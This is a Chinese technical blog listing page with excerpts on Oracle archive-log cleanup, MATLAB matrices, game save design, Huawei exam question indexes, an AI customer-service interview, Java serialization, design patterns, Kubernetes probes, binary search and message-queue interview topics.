	<div class="content list__excerpt post__content clearfix">
		 [64000][257] ORA-00257: archiver error. Connect internal only, until freed. 原因 归档日志写满了、闪回日志写满了(根本原因是服务器磁盘写满了)
# 切换到oracle服务 su - oracle # 使用sysdba用户登录 解决方案:(https://blog.csdn.net/qq_37635373/article/details/93328211) sqlplus /nolog conn /as sysdba 查看 archive log 存放位置 # 显示数据库参数`log_archive_dest`的当前设置值 show parameter log_archive_dest 归档日志模式的状态信息 archive log list; 数据库是否处于ARCHIVELOG模式或NOARCHIVELOG模式。
ARCHIVELOG模式：当数据库在此模式下运行时，所有的重做日志文件在被重用前都会被归档保存。这允许进行点对点的恢复。NOARCHIVELOG模式：在此模式下，重做日志文件在空间需要时可以被覆盖，不进行归档。这意味着无法进行点对点的恢复，只能恢复到最后一次完整备份。 归档日志的当前位置和状态。
已经归档的日志文件的序列号。
下一个归档日志文件的预期序列号。
查看 Flash Recovery Area 的情况 # 可以看到 PERCENT_SPACE_USED 的占用百分比是多少 select * from V$FLASH_RECOVERY_AREA_USAGE; 查看归档文件路径 show parameter recover; 找到归档文件路径,对文件进行删除,注意保留最近的几个文件
需要处理数据库备份及恢复工具 在删除归档日志后，必须用RMAN维护控制文件，否则空间显示仍然不释放。(RMAN是Oracle提供的一个备份和恢复管理工具，可以帮助数据库管理员进行数据库的备份和恢复操作)
rman target sys/pass # 命令会检查所有的归档日志文件，验证RMAN的记录与磁盘或媒体上实际存在的归档日志文件是否一致。如果RMAN记录中的文件在磁盘或媒体上不存在，那么这个文件在RMAN的记录中的状态就会被标记为`EXPIRED`。 只会更新RMAN的记录，不会实际删除任何文件 crosscheck archivelog all; # 删除所有标记为`EXPIRED`状态的归档日志文件。 delete expired archivelog all; # 删除所有直到昨天为止的归档日志文件,注意: 这个命令会实际删除磁盘上的归档日志文件，而不仅仅是删除RMAN的记录。所以在执行这个命令之前，你需要确保你不再需要这些归档日志文件,或者归档文件已经被备份 delete archivelog until time ‘sysdate-1 检查是否处理完成 select * from V$FLASH_RECOVERY_AREA_USAGE; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cec545c25fb9ef615a40e54458c5c18/" rel="bookmark">
			利用MATLAB构建特殊通用矩阵
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在MATLAB编程中，经常需要遇到一些特殊的通用矩阵，本篇主要介绍的是MATLAB中可能会用到特殊矩阵。
1、零矩阵 MATLAB使用zeros函数来创建零矩阵，所谓零矩阵就是矩阵中所有元素皆为0的矩阵。zeros函数的调用方式如下所示：
（1）zeros(n)：n为常数，生成一个n×n的矩阵。
例如，生成一个4×4的零矩阵的代码为：
a=zeros(4) 运行结果如下所示：
a = 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 当n的值省略的时候，那么生成一个1×1的向量，结果如下所示：
ans = 0 （2）zeros(m,n)：m，n均为常数，生成一个m×n的零矩阵。生成一个m×n的零矩阵也可以写成zeros([m,n])的方式。
例如生成一个3×4的零矩阵的代码如下：
a=zeros(3,4) 运行结果如下所示：
a = 0 0 0 0 0 0 0 0 0 0 0 0 （3）zeros(size(A))：A为矩阵，zeros生成一个与矩阵A相同行和列的零矩阵。
例如：
A=[3,4,5;2,7,8]; a=zeros(size(A)) 运行结果如下所示：
a = 0 0 0 0 0 0 （4）zeros(m,n,'like',p)：p为矩阵，生成一个与p类型相同，大小为m行n列的零矩阵。
例如：
p=[2+1i,3;4,2+3i]; zeros(3,2,'like',p) 在上述代码段中的p矩阵为一个复数矩阵，那么matlab中所求的结果应为一个3行2列的复数矩阵。运行结果如下所示：
ans = 0.0000 + 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cec545c25fb9ef615a40e54458c5c18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af60020ee1b32561f5a83363a609ce6e/" rel="bookmark">
			单机游戏数据自动保存方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 单机游戏数据的自动保存方案
大家好，2023年还有最后的3天！
有小伙伴私信我，说:
总感觉一股脑的全盘定时保存不科学，也写过保存变化的玩家数据，但是改完数据就得手动标记一下字段变化，感觉不够智能，不知道有没好的设计模式之类可以解决，就只管更新数据就行。
笔者认真思考了一下，结合前面的项目里面用到的，给大家分析一下，大家可以根据具体情况看看。
本文将介绍一下单机游戏数据的自动保存方案。
本文源工程可在文末阅读原文获取，小伙伴们自行前往。
1.需求分析 根据小伙伴的私信，需求如下：
全盘定时保存不科学。保存变化的玩家数据，需要手动标记，不智能。有没有办法只管更新数据就行。 我们接下来具体分析一下
2.具体分析 1.全盘定时保存 其实全盘定时保存也不是不好的设计方案，只是他也是需要针对变化的数据进行存盘。
也就是说我们需要对变化的数据进行标记，在执行全盘保存的时候，需要根据标记位来进行存储。
这方案在后端开发其实是很常见的，定时存盘+离线存盘。
能够有效地保证数据存储无误、存储效率更高，服务器宕机时损失最少。
2.手动标记 手动标记其实是最有效，最直接的去控制指定内容是否需要存盘的方法。
但是由于是手动标记，也就是人为操作，难免会出现错漏的情况。
因此可以借助一下设计模式，去优化一下设计，在数据变化时可以自动标记。
下面一起来看下自动保存常用设计模式
3.数据自动保存设计模式 下面是查阅相关资料之后整理出来的一些设计模式和方法：
观察者模式： 使用观察者模式来监测游戏中的变化。每个可能修改数据的对象都是观察者，而存档系统是主题。当对象发生变化时，它通知主题，主题再负责触发保存。
Dirty Flag模式： 引入“脏标志”来标记对象是否发生变化。只有在对象发生变化时才进行保存。这种方式可以减少不必要的保存操作。
快照模式： 定期创建游戏状态的快照，而不是全盘保存。这样可以避免频繁的保存操作，只在需要时加载最近的快照。
增量保存： 只保存发生变化的部分数据，而不是整个数据集。这可以减少保存和加载的时间，尤其是在数据量较大的情况下。
接下来直接看下实例
4.观察者模式 我们使用观察者模式来完成一个数据自动保存的实例。
首先我们准备一下玩家数据，其中包括：
角色名等级 // PlayerData.ts export class PlayerData { name: string; level: number; constructor(data: any) { this.name = data.name; this.level = data.level; } } 然后，我们定义一个通用的观察者接口：
// Observer.ts export interface Observer&lt;T&gt; { update(data: T): void; } 再然后，实现一个具体的观察者，即自动保存数据的观察者，核心内容如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af60020ee1b32561f5a83363a609ce6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43812122a1fcac45043bd146224fb8aa/" rel="bookmark">
			2023华为od机考题库（C&#43;&#43;）【A卷&#43;B卷&#43;C卷&#43;D卷】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本专栏使用C++语言解题 常见问题 1：进入机考网页之后如果链接上写着【C卷】，就表示是C卷题库。在2023年11月之后，大多数同学收到的应该是B卷+C卷题库。
2：2022年的题库已经废弃，如果时间紧迫，建议直接刷2023年新题。
3：如果机试挂了，6个月之后可以再考。
4：订阅专栏后，后面更新的答案都可以查看。以后更新的题目也会放到这个专栏里。
5：如果对题解有问题，私信我解答。 最新B+C+D卷目录 题目考点时间分值计算数组中心位置（免费试读）逻辑推理2023年C卷100区间交叠（免费试读）贪心算法2023年C卷200BOSS的收入深度优先搜索2023年C卷100编码能力的提升二分法2023年C卷200对采样进行过滤逻辑分析2023年C卷100颜色统计方法滑动窗口2023年C卷100寻找最接近数滑动窗口2023年C卷100URL的拼接正则匹配2023年C卷100字符串切割前缀和2023年C卷100选修课自定义排序2023年C卷100拷贝文件01背包问题2023年C卷200报数规则数学推理2023年C卷100报文回路逻辑推理2023年C卷100数字谜题前缀和2023年C卷100喊七游戏数学问题2023年C卷100报数问题约瑟夫环2023年C卷100跳房子逻辑推理2023年C卷100字符化繁为简字符串处理2023年C卷100同时出现的整数逻辑推理2023年C卷200整数编码进制转化2023年C卷200优先队列问题set的应用2023年C卷200寻找宝箱的位置逻辑推理2023年C卷200创建二叉树二叉树2023年C卷100数组最大差值空间换时间2023年C卷200最小步数找规律2023年C卷200拔河比赛自定义排序2023年C卷200文件目录大小深度优先搜索2023年C卷200黄金宝箱（五）滑动窗口2023年C卷100最大可靠设备二分查找2023年C卷100回文字符串字符串处理2023年C卷100最快方法逻辑推理2023年C卷200平均值最大的子数组二分法2023年C卷200最多的直角三角形回溯法2023年C卷200限载货物最小值二分法2023年C卷200最佳对手逻辑推理2023年C卷100文件目录大小dfs2023年C卷200单词加密正则匹配2023年C卷200分奖金深度优先搜索2023年C卷200最接近的数滑动窗口2023年C卷100最小延迟（二）最短路径2023年C卷100内存分配逻辑推理2023年C卷100TLV解析逻辑推理2023年C卷200机房布局动态规划2023年C卷100统计非1元素广度优先搜索2023年C卷100静态扫描贪心算法2023年C卷100座位调整动态规划2023年C卷100模拟消息队列逻辑推理2023年C卷200黄金宝箱（一）逻辑推理2023年C卷200最佳植树距离二分法2023年C卷100插队优先队列2023年C卷100稀疏矩阵数组扫描2023年B卷200监视器的数量深度优先搜索2023年B卷200猜数字枚举2023年B卷100称砝码动态规划2023年B卷100堆积木子集问题2023年B卷100人数最多的站点优先队列2023年B卷200快递投放逻辑推理2023年B卷200单词加密正则匹配2023年B卷100比大小正则匹配2023年B卷100优先级队列字典的应用2023年B卷200最长公共后缀逻辑推理2023年B卷100最节约的备份方法二分法2023年B卷100恢复数字序列滑动窗口2023年B卷100代表团坐车动态规划2023年B卷200IPV4转化为整数字符串处理2023年B卷200报文回路逻辑推理2023年B卷200告警抑制送分题2023年B卷100冠亚季军自定义排序2023年B卷100响应报文的时间字符串处理2023年B卷200食堂供餐二分法2023年B卷200报文重排序字符串处理2023年B卷100最小步数规律归纳2023年B卷100分割数组最大值空间换时间2023年B卷200乘坐保密电梯深度优先搜索2023年B卷200五子棋爱好者双指针2023年B卷100火星改造广度优先搜索2023年B卷200周末爬山深度优先搜索2023年B卷200战场索敌广度优先搜索2023年B卷200最小循环子数组KMP算法2023年B卷200小朋友的数量逻辑推理2023年B卷100黄金宝箱（四）逻辑推理2023年B卷100跳房子（二）双指针2023年B卷200符合要求元组的个数分治法2023年B卷200代码编辑器逻辑推理2023年B卷100生日礼物二分查找2023年B卷200优秀学员统计自定义排序2023年B卷100查找人名字符串处理2023年B卷100观看表演贪心算法2023年B卷200扩散矩阵广度优先搜索2023年B卷200二叉树的中序遍历二叉树的遍历2023年B卷100异常的打卡记录逻辑推理2023年B卷100不相交的子序列动态规划2023年B卷100猜字谜逻辑推理2023年B卷100去除多余的空格字符串处理2023年B卷100优雅子数组双指针2023年B卷200计算快递主站点并查集2023年B卷200跳房子（二）排序+双指针2023年B卷200最长公共后缀字符串处理2023年B卷200恢复数字序列滑动窗口2023年B卷200查字典字符串处理2023年B卷100计算误码率字符串处理2023年B卷100数字整除数学推理2023年B卷100最大价值的矿堆深度优先搜索2023年B卷200玩牌获得的最大分动态规划2023年B卷200最佳的出牌方法逻辑推理2023年B卷100 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d43784da903b0db858ad0f332c3d348c/" rel="bookmark">
			2023华为od机考 Python【A卷&#43;B卷&#43;C卷&#43;D卷】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本专栏使用Python解题 常见问题 1：进入机考网页之后如果链接上写着【C卷】，就表示是C卷题库。在2023年11月之后，大多数同学收到的应该是B卷+C卷题库题库。
2：2022年的题库已经废弃，如果时间紧迫，建议直接刷2023年新题。
3：如果机试挂了，6个月之后可以再考。
4：订阅专栏后，后面更新的答案都可以查看。以后更新的题目也会放到这个专栏里。
5：如果对题解有问题，私信我解答。 最新B卷+C卷+D卷目录 题目考点时间分值计算数组中心位置（免费试读）逻辑推理2023年C卷100区间交叠（免费试读）贪心算法2023年C卷200BOSS的收入深度优先搜索2023年C卷200编码能力的提升二分法2023年C卷200对采样进行过滤逻辑分析2023年C卷200颜色统计方法滑动窗口2023年C卷100寻找最接近数滑动窗口2023年C卷100URL的拼接方法正则匹配2023年C卷100分割字符串前缀和2023年C卷100选修课自定义排序2023年C卷100拷贝文件01背包问题2023年C卷200报数规则数学推理2023年C卷100报文回路逻辑推理2023年C卷100数字谜题前缀和2023年C卷100喊七游戏数学问题2023年C卷100报数问题约瑟夫环2023年C卷100跳房子逻辑推理2023年C卷100字符化繁为简字符串处理2023年C卷100同时出现的整数逻辑推理2023年C卷200整数编码进制转化2023年C卷200优先队列问题set的应用2023年C卷200寻找宝箱的位置逻辑推理2023年C卷200创建二叉树二叉树2023年C卷100数组最大差值空间换时间2023年C卷200最小步数找规律2023年C卷200拔河比赛自定义排序2023年C卷200文件目录大小深度优先搜索2023年C卷200黄金宝箱（五）滑动窗口2023年C卷100最大可靠设备动态规划2023年C卷100回文字符串字符串处理2023年C卷100最快方法逻辑推理2023年C卷200服务中心地址逻辑推理2023年C卷200平均值最大的子数组二分法2023年C卷200最多的直角三角形回溯法2023年C卷200限载货物最小值二分法2023年C卷200最佳对手逻辑推理2023年C卷100文件目录大小dfs2023年C卷200单词加密正则匹配2023年C卷200分奖金深度优先搜索2023年C卷200最接近的数滑动窗口2023年C卷100最小延迟（二）最短路径2023年C卷100内存分配逻辑推理2023年C卷100TLV解析逻辑推理2023年C卷200机房布局动态规划2023年C卷100统计非1元素广度优先搜索2023年C卷100静态扫描贪心算法2023年C卷100座位调整动态规划2023年C卷100模拟消息队列逻辑推理2023年C卷200黄金宝箱（一）逻辑推理2023年C卷200最佳植树距离二分法2023年C卷100插队优先队列2023年C卷100稀疏矩阵数组扫描2023年C卷200监视器的数量深度优先搜索2023年C卷200猜数字枚举2023年C卷100称砝码动态规划2023年C卷100堆积木子集问题2023年C卷100人数最多的站点优先队列2023年C卷200快递投放逻辑推理2023年C卷200单词加密正则匹配2023年B卷100比大小正则匹配2023年B卷100优先级队列字典的应用2023年B卷200最长公共后缀逻辑推理2023年B卷100最节约的备份方法二分法2023年B卷100恢复数字序列滑动窗口2023年B卷100代表团坐车动态规划2023年B卷200IPV4转化为整数字符串处理2023年B卷200报文回路逻辑推理2023年B卷200告警抑制送分题2023年B卷100冠亚季军自定义排序2023年B卷100响应报文的时间字符串处理2023年B卷200食堂供餐二分法2023年B卷200报文重排序字符串处理2023年B卷100最小步数规律归纳2023年B卷100分割数组最大值空间换时间2023年B卷200乘坐保密电梯深度优先搜索2023年B卷200五子棋爱好者双指针2023年B卷100火星改造广度优先搜索2023年B卷200周末爬山深度优先搜索2023年B卷200战场索敌广度优先搜索2023年B卷200最小循环子数组KMP算法2023年B卷200小朋友的数量逻辑推理2023年B卷100黄金宝箱（四）逻辑推理2023年B卷100跳房子（二）双指针2023年B卷200符合要求元组的个数分治法2023年B卷200代码编辑器逻辑推理2023年B卷100生日礼物二分查找2023年B卷200优秀学员统计自定义排序2023年B卷100查找人名字符串处理2023年B卷100观看表演贪心算法2023年B卷200扩散矩阵广度优先搜索2023年B卷200二叉树的中序遍历二叉树的遍历2023年B卷100异常的打卡记录逻辑推理2023年B卷100不相交的子序列动态规划2023年B卷100猜字谜逻辑推理2023年B卷100去除多余的空格字符串处理2023年B卷100优雅子数组双指针2023年B卷200计算快递主站点并查集2023年B卷200跳房子（二）排序+双指针2023年B卷200最长公共后缀字符串处理2023年B卷200恢复数字序列滑动窗口2023年B卷200查字典字符串处理2023年B卷100数字整除数学推理2023年B卷100计算误码率字符串处理2023年B卷100最大价值的矿堆深度优先搜索2023年B卷200玩牌获得的最大分动态规划2023年B卷200最佳的出牌方法逻辑推理2023年B卷100 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2f51cc922f3f68aaba4f876a3579423/" rel="bookmark">
			网易云商冯旻伟：“大模型是下一代信息系统的大脑”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编者按
AIGC时代，大模型在智能客服领域的应用一直备受关注，其不断演进的技术给用户体验和业务效率带来了全新的可能性。
近日，我们有幸采访了网易云商AI技术线的负责人冯旻伟，深入了解了他们在智能客服方面的创新和实践。从文字交互到语音交互，AIGC的应用正在为用户提供更智能、高效的服务。在未来，随着大模型的多模态能力持续完善，AI将为智能营销与智能客服业务注入更多活力。
以下是这场专访的一些精彩片段，一同探讨AIGC在智能客服中的发展现状、技术演进与未来展望，稿件分为以下四部分：
1.文字or语音交互，孰易孰难？
2.被告知机器人身份后，语音的拟人化还有意义吗？
3.多模态的智能客服何时成为现实？
4.GPU资源受限，如何完成模型训练？
采访对象/冯旻伟
策划、编辑/李美涵
采访对象
冯旻伟，2017年加入网易，担任网易云商AI技术线负责人，负责自然语言处理和语音算法能力建设及产品赋能。拥有十余年AI算法行业从业经验，曾就职于德国亚琛工大人类语言研究所、IBM Watson 实验室、阿里巴巴达摩院。拥有丰富的工业界AI项目经验，参与的项目领域包括AI原子能力PaaS服务、企业SaaS、智能语音导航系统、智慧屏、车机交互系统等。
1
文字or语音交互，
孰易孰难？
”
LiveVideoStack：旻伟老师好，在访谈开始时，请简单介绍一下自己和您团队目前专注的产品及业务吧？
冯旻伟: 你好，我目前在网易云商担任 AI 技术线负责人。网易云商是网易智企旗下的服务营销一体化平台，整合云计算、大数据、人工智能等技术，形成了七鱼智能客服、智能洞察、私域增长三大产品体系。
从技术角度来讲，研发工作主要是两个方向：1. NLP （编者注：Natural Language Processing ，自然语言处理）；2. 语音， 对应到产品形态上分别是文本机器人和语音交互机器人。
从业务角度来讲，我们为企业提供服务营销一体化的 SaaS （编者注：Software as a Service ，软件运营服务）服务，包括例如智能客服、智能外呼、问卷调研。
LiveVideoStack：您在做文本和语音交互机器人时，技术上有什么不同或者是偏重吗？哪方面遇到的技术挑战会更多一点？
冯旻伟: 挑战的话两者都有，但直接比较难度不太合适，因为它们两个不是一个维度上的事情。
NLP 的核心任务或者说技术难点是消除歧义与意图理解。另外客服场景文本机器人的知识提取与表征往往是一个难点。智能客服需要代替人去回答问题、处理投诉，这些都需要知识，在这个过程中要根据特定行业与客户的需求进行知识提取并转化为软件系统可处理的形态。在实际应用落地过程中，这往往是一个难点。
语音方面的挑战主要在于系统的鲁棒性。在现实中，输入的语音不可能都是清晰普通话，各类方言，口音轻重，不同环境的噪音，性别年龄，录音设备等因素都会显著增加语音信息的处理难度。
LiveVideoStack：那我们先来聊一聊语音交互，我比较好奇的一个点，在您进行模型训练的时候，方言理解的这个问题是怎样进行解决的？
冯旻伟:方言是个挺复杂的问题，我们可以分情况来看。
有些方言本质上是另外一种语言。比如藏语、维语，它和普通话是完全不同的两种语言。这种情况下通常是独立搭建一套该方言的语音识别系统。
还有些方言，接近普通话，大家都能听懂，比如中国北方的一些方言。这种情况下方言问题更多表现为口音的变化，那么我们可以通过搜集范围更广的训练数据来提升系统的处理能力。
相较而言，实际中第二种情况更普遍，一则社会进步，大家的普通话越来越标准，大家对在正式场合讲普通话也形成共识；二来单独建一套方言处理系统的成本很高。
目前AI正朝着通用人工智能的方向发展，最新的技术会把多种方言甚至不同语种放在一个大模型里统一处理。
LiveVideoStack：当作为“新语言”的方言模型训练完成，比如说理解藏语的模型，在真正投入使用之前会经过哪些步骤，才会上线？
冯旻伟:跟普通话是一样的。采用多种手段，包括外部采购，内部标注，TTS 生成，现有系统伪标签等手段构建训练数据，精准标注业务场景的测试数据。然后就是模型训练与评估，在测试数据上的准确率符合要求后会进行性能方面的测试。在测试数据的识别正确率方面，我们会设置一个需要达到的预定要求。这个要求是根据应用场景来设定的。通常取决于下游应用场景，要求不高的场景， 85% 正确率就可以了。有些复杂场景，比如涉及多轮对话的语义理解，有时候正确率要到 95% 以上。
达到预定要求后，就会开始上线流程。这方面 Web 服务已经有比较成熟的方案来实现高可用。
2
被告知机器人身份后，
语音的拟人化还有意义吗？
”
LiveVideoStack：大家在生活中，已经开始接到很多由智能外呼拨打的电话了。有一个问题是，我们很容易辨别出电话另一端的是 AI 而非真人。我们应该如何平衡 AI 技术和用户服务的问题，避免用户产生负面情绪或是被打扰的感觉？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2f51cc922f3f68aaba4f876a3579423/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab4620124ad9803f2e4d5cb03da106cf/" rel="bookmark">
			java序列化是什么做什么用的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ava序列化是指将一个Java对象转换为字节流的过程，以便将其存储到文件或通过网络发送到另一个Java虚拟机（JVM）。反序列化则是将字节流转换回Java对象的过程。
Java序列化的主要用途包括：
对象持久化：将对象保存到文件或数据库中，以便在程序关闭后再次加载时恢复对象的状态。分布式计算：通过网络将对象从一个JVM发送到另一个JVM，以便在分布式系统中共享对象的状态。组件和插件：将对象作为组件或插件在应用程序之间进行传输，以便实现可扩展性和模块化。 尽管Java序列化具有一定的用途，但它并不是一个完美的解决方案，存在一些限制和问题：
版本兼容性：如果一个类在不同版本之间进行了修改，那么旧版本的类可能无法反序列化成新版本的类，反之亦然。安全性：序列化可以将任意对象转换为字节流，因此存在安全风险，例如恶意代码注入攻击。性能开销：序列化和反序列化过程需要一定的时间和空间开销，可能不适合对性能要求较高的场景。无法序列化的对象：一些内置类型、类对象、方法等无法被序列化。 因此，在实际开发中，应该根据具体的需求和场景来选择合适的解决方案，而不是一味地使用Java序列化。例如，可以使用数据库、缓存系统、消息队列等其他技术来实现持久化、分布式计算和组件通信等功能。
所谓对象流也就是将对象的内容进行流化。可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。序列化是为了解决在对对象流进行读写操作时所引发的问题。序列化的实现：将需要被序列化的类实现Serializable接口，该接口没有需要实现的方法，implements Serializable只是为了标注该对象是可被序列化的，然后使用一个输出流(如：FileOutputStream)来构造一个ObjectOutputStream(对象流)对象，接着，使用ObjectOutputStream对象的writeObject(Object obj)方法就可以将参数为obj的对象写出(即保存其状态)，要恢复的话则用输入流。
下面是一个简单的Java序列化示例：
import java.io.*; class Person implements Serializable { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String toString() { return "Person [name=" + name + ", age=" + age + "]"; } } public class SerializationExample { public static void main(String[] args) { Person person = new Person("Alice", 25); try { FileOutputStream fileOut = new FileOutputStream("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab4620124ad9803f2e4d5cb03da106cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d8981f8a38a058ff001c755550bc0d4/" rel="bookmark">
			Java设计模式-装饰者模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、星巴克咖啡订单项目
二、装饰者模式
（一）定义
（二）原理
（三）装饰者模式解决星巴克咖啡订单
一、星巴克咖啡订单项目 星巴克咖啡订单项目（咖啡馆）： 1) 咖啡种类 / 单品咖啡： Espresso( 意大利浓咖啡 ) 、 ShortBlack 、 LongBlack( 美式咖啡) 、 Decaf( 无因咖啡 ) 2) 调料： Milk 、 Soy( 豆浆 ) 、 Chocolate 3) 要求在扩展 新的咖啡种类 时，具有良好的扩展性、改动方便、维护方便 4) 使用 OO 的来计算不同种类咖啡的 费用 : 客户可以点 单品咖啡 ，也可以 单品咖 啡 + 调料组合 。 方案一：
1) Drink 是一个抽象类，表示饮料 2) des 就是对咖啡的描述 , 比如咖啡的名字 3) cost() 方法就是计算费用， Drink 类中做成一个抽象方法 . 4) Decaf 就是单品咖啡， 继承 Drink, 并实现 cost 5) Espress &amp;&amp; Milk 就是单品咖啡 + 调料， 这个组合很多 6) 问题：这样设计，会有很多类，当我们增加一个单品咖啡，或者一个新的调料，类的数量就会倍增，就会出现类爆炸 方案二：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d8981f8a38a058ff001c755550bc0d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a880e37613033b0823fc2fe00874fc6f/" rel="bookmark">
			K8s实战-基于LivenessProbe健康检查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LivenessProbe探针用于判断容器是否存活，如果探测到容器不健康，则kubelet将杀掉该容器，然后根据重启策略处理。
LivenessProbe的实现方式：
ExecAction：在容器内部执行一个命令，如果该命令的返回码为0，则健康TCPSocketAction：在容器内部使用TCP建立连接HTTPGetAction：使用http方式访问容器服务，如果http相应码在200-400之间则认为容器健康 下面我们就一一来实践一下
1、ExecAction yaml
apiVersion: v1 kind: Pod metadata: creationTimestamp: null labels: run: liveness name: liveness spec: containers: - image: busybox name: liveness args: - /bin/sh - -c - echo ok &gt; /tmp/health; sleep 10; rm -rf /tmp/health; sleep 600 livenessProbe: exec: command: - cat1 - /tmp/health initialDelaySeconds: 5 timeoutSeconds: 1 我们把cat命令故意写错成cat1，测试如下：
可以看到探测不成功一直在重启，符合预期！
2、TCPSocketAction yaml
apiVersion: v1 kind: Pod metadata: creationTimestamp: null labels: run: liveness name: liveness spec: containers: - image: nginx name: liveness livenessProbe: tcpSocket: port: 8080 initialDelaySeconds: 5 timeoutSeconds: 1 我们把port改成8080，测试如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a880e37613033b0823fc2fe00874fc6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01218f4f5071443dfc0fee4a78af9f6c/" rel="bookmark">
			Python - 深夜数据结构与算法之 Binary Search
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.引言
二.二分查找的简介
1.查找条件
2.代码模版
3.查找示例
三.经典算法实战
1.Search-Rotated-List [33]
2.Sqrt-X [69]
3.Search-2D-Matrix [74]
4.Find-Rotated-Min [153]
5.Valid-Perfect-Square [367]
四.总结
一.引言 前面介绍了二叉树和堆，其中涉及到有树和二叉搜索的概念，今天将二者整合介绍下常见的二分查找的问题。
二.二分查找的简介 1.查找条件 单调性 - 如果对应数据不具有单调性性质，则我们只能 o(n) 遍历寻找
上下界 - 存在上下界才能不断缩小范围
索引访问 - 列表可以，单链表的话不支持索引访问不容易二分
2.代码模版 right、left 即为我们的上下界，通过 mid 每次将搜索范围减半，时间复杂度为 log。代码模版中我们默认是升序排列的，如果是降序排序需要修改下elif 和 else 的逻辑，我们主要掌握上面的模版，即 left、rigth 的起始点，如何获取 mid 并判断。
3.查找示例 数组满足有序、有界、索引访问所以可以进行二分查找，不断寻找 mid 缩小 left、right 的范围，就像高数里求数学极限的夹逼准则一样，直到找到 target 或者退出。
三.经典算法实战 1.Search-Rotated-List [33] 搜索旋转排序数组: https://leetcode.cn/problems/search-in-rotated-sorted-array
◆ 题目分析
对一个旋转后的有序数组进行排序，最暴力的方法无非 o(n) 遍历，找到突变的 index，即前后元素不保序，随后将数组恢复为有序再 sort，这个方法是最基础的，不过这里也可以套用二分查找的模版，只不过判断的边界条件会复杂一些，下面尝试下。
◆ 二分查找
class Solution(object): def search(self, nums, target): "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01218f4f5071443dfc0fee4a78af9f6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d59b70b993e64c1a0f355b38d761d63f/" rel="bookmark">
			消息队列考点梳理 &#43; 高频面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你好，本文我将和你一起梳理面试中消息队列的高频考点，做到温故知新。
面试中如何考察消息队列 消息队列作为日常开发中应用最高频的基础组件之一，相关的问题自然也是面试中的常客。
在面试中对消息队列的考察方式，主要包括两种形式，一种是针对消息队列的相关理论，比如消息队列重复消费、消费幂等性、消息队列的可靠传输等；另一种考察方式是针对某个具体的消息队列中间件，考察组件应用的原理，实现方案和应用细节，比如常见的 Kafka、RabbitMQ、RocketMQ 等消息队列组件。
下面我梳理了一些面试中的高频问题，你可以对照这些问题，检测自己是否掌握了问题考察的内容，针对自己薄弱的环节，进行针对性地提高。
消息队列理论高频问题 对消息队列应用相关理论和设计的考察，面试官可以提出下面一系列的问题：
如何保证消息队列的高可用？
如何保证消息不被重复消费？
如何保证消费的时候是幂等？
如何保证消息的可靠性传输？
传输过程出现消息丢失了怎么办？
如何保证消息的顺序性？
如何解决消息队列的延时问题？
如何解决消息队列的过期失效问题？
消息队列满了以后该怎么处理？
有几百万消息持续积压几小时，应该怎么解决？
如果让你写一个消息队列，该如何进行架构设计？
可以看到，这方面的问题非常重视考察候选人对实际问题处理的经验，不过没有固定的答案。我在专栏里多次强调，授人以鱼不如授人以渔，关于分布式的方法论是最重要的。如果让你从零到一设计一个消息队列，该如何展开呢？你可以从分布式的基础理论出发，从数据存储的一致性，集群扩展结合我在分布式消息队列模块所讲解的内容，同时融入自己对系统架构的理解，最后形成自己的观点。
消息队列应用高频问题 面试中对具体某一种消息组件的考察，一般是候选人有过该组件的应用经验，重点是考察候选人对基础组件掌握的深度，出现问题后的解决办法等。
以 Kafka 为例，可以提出以下的问题：
描述一下 Kafka 的设计架构？
Kafka、ActiveMQ、RabbitMQ、RocketMQ 之间都有什么区别？
Kafka 消费端是否可能出现重复消费问题？
Kafka 为什么会分区？
Kafka 如何保证数据一致性？
Kafka 中 ISR、OSR、AR 是什么？
Kafka 在什么情况下会出现消息丢失？
Kafka 消息是采用 Pull 模式，还是 Push 模式？
Kafka 如何和 ZooKeeper 进行交互？
Kafka 是如何实现高吞吐率的？
